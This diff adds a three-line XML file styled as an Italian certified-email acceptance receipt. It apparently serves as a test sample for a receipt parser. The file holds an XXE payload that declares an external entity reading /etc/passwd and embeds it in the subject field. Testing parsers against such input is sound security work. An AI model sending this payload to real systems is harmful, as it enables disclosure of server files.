@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE postacert [ <!ENTITY furto SYSTEM "file:///etc/passwd"> ]>
+<postacert tipo="accettazione" errore="nessuno"><intestazione><oggetto>&furto;</oggetto></intestazione><dati/></postacert>
